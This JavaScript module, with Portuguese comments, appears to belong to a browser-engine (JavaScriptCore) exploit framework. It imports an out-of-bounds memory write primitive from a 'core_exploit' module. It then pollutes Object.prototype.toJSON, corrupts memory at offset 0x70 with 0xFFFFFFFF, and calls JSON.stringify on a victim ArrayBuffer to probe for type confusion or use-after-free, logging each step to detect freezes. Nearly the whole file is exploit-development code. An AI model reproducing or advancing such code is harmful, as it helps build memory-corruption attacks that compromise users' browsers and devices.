// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// --- Parâmetros de Teste Configuráveis (agora fixos para este teste) ---
const SPECIFIC_TEST_PARAMS = {
    victim_ab_size: 64,
    // Offset (0x70 se BASE_OFFSET_IN_DV for 128) e valor que causavam o congelamento
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // (128 - 16 = 112 = 0x70)
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "FocusedFreezeTest_Offset0x70_ValFFFF"
};
// --- Fim dos Parâmetros ---

// Variável para contar chamadas toJSON, se necessário dentro do toJSON
let callCount_toJSON_freeze_test = 0;

export async function runSpecificFreezingTest_0x70_FFFF() { // Nome da função exportada alterado
    const FNAME = `runSpecificFreezingTest_0x70_FFFF`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKey,
        description
    } = SPECIFIC_TEST_PARAMS;

    logS3(`--- Iniciando Teste de Congelamento Focado: ${description} ---`, "test", FNAME);
    logS3(`   Parâmetros: victim_size=${victim_ab_size}, ppKey=${ppKey}`, "info", FNAME);
    logS3(`   Offset Corrupção (abs em oob_real): ${toHex(corruption_offset)}`, "info", FNAME);
    logS3(`   Valor para corrupção: ${toHex(value_to_write)}`, "info", FNAME);
    document.title = "Iniciando: " + description;

    callCount_toJSON_freeze_test = 0; // Resetar contador
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let testPotentiallyFroze = true; // Assumir que vai congelar, a menos que complete
    let stepReached = "antes_pp";

    try {
        logS3(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME);
        document.title = "Aplicando PP...";
        stepReached = "aplicando_pp";

        Object.defineProperty(Object.prototype, ppKey, {
            value: function() {
                callCount_toJSON_freeze_test++;
                const currentOperationThis = this;
                // Canary log para a primeira chamada ao toJSON
                if (callCount_toJSON_freeze_test === 1) {
                    document.title = `toJSON Chamada ${callCount_toJSON_freeze_test}`;
                    logS3(`[${ppKey} Poluído - v2 Refinado] Chamada ${callCount_toJSON_freeze_test}!`, "vuln", FNAME);
                }
                // Se congelar, pode ser difícil obter mais logs daqui.
                // A lógica interna do toJSON da versão "v2 - Refinado" que você disse que congela:
                logS3(`  [Call ${callCount_toJSON_freeze_test}] typeof this: ${typeof currentOperationThis}`, "info", FNAME);
                logS3(`  [Call ${callCount_toJSON_freeze_test}] this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
                try {
                    logS3(`  [Call ${callCount_toJSON_freeze_test}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME);
                } catch (e) {
                    logS3(`  [Call ${callCount_toJSON_freeze_test}] Erro ao acessar this.constructor.name: ${e.message}`, "warn", FNAME);
                }

                let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
                try {
                    details.byteLength = currentOperationThis.byteLength;
                    if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
                        let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
                        let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
                        if (bufferToView.byteLength >= offsetInView + 4) {
                           details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
                        }
                    }
                    details.slice_exists = (typeof currentOperationThis.slice === 'function');
                    logS3(`  [Call ${callCount_toJSON_freeze_test}] Detalhes: byteLength=${details.byteLength}, 1stDword=${toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
                    return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
                } catch (e) {
                    logS3(`  [Call ${callCount_toJSON_freeze_test}] [${ppKey} Poluído] ERRO ao acessar props: ${e.message}`, "critical", FNAME);
                    document.title = `ERRO no toJSON Call ${callCount_toJSON_freeze_test}`;
                    testPotentiallyFroze = false; // Erro JS explícito, não um congelamento silencioso
                    return { toJSON_error: true, message: e.message };
                }
            },
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`Object.prototype.${ppKey} poluído com lógica "v2 - Refinado".`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = "PP Aplicada";

        if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
            logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME);
            stepReached = "antes_escrita_oob";
            document.title = "Antes Escrita OOB";
            oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            logS3("Escrita OOB realizada.", "info", FNAME);
            stepReached = "apos_escrita_oob";
            document.title = "Após Escrita OOB";
        } else {
            logS3(`AVISO: Offset de corrupção inválido. Escrita OOB não realizada.`, "warn", FNAME);
            stepReached = "escrita_oob_pulada";
            document.title = "Escrita OOB Pulada";
        }

        await PAUSE_S3(MEDIUM_PAUSE_S3);
        stepReached = "antes_stringify";
        document.title = "Antes Stringify";
        logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO PARA CONGELAMENTO)`, "info", FNAME);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab);
            stepReached = "apos_stringify"; // Se chegou aqui, não congelou totalmente ou erro foi capturável
            document.title = "Stringify Retornou";
            testPotentiallyFroze = false; // Completou ou erro JS
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
                logS3("SUCESSO ESPECULATIVO: Erro capturado dentro do toJSON.", "vuln", FNAME);
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = "ERRO Stringify: " + e.name;
            testPotentiallyFroze = false; // Erro JS explícito
            logS3(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME);
            console.error(`JSON.stringify Test Error (${description}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = "ERRO Principal Teste";
        testPotentiallyFroze = false; // Erro JS explícito
        logS3(`Erro principal no teste (${description}): ${mainError.message}`, "error", FNAME);
        console.error(mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME);
        if (testPotentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo logado antes do ponto crítico: ${stepReached}`, "warn", FNAME);
            document.title = `CONGELOU? Passo: ${stepReached}`;
        }
    }
    logS3(`--- Teste de Congelamento Focado Concluído: ${description} (Chamadas toJSON: ${callCount_toJSON_freeze_test}) ---`, "test", FNAME);
    if (!testPotentiallyFroze) {
        document.title = "Teste Concluído Sem Congelamento Aparente";
    }
}

// Mantemos a função original para compatibilidade, mas ela não será chamada diretamente pelo runAllAdvancedTestsS3 modificado.
export async function testJsonTypeConfusionUAFSpeculative() {
    logS3("Executando runSpecificFreezingTest_0x70_FFFF em vez da varredura completa.", "warn", "testJsonTypeConfusionUAFSpeculative");
    await runSpecificFreezingTest_0x70_FFFF();
}
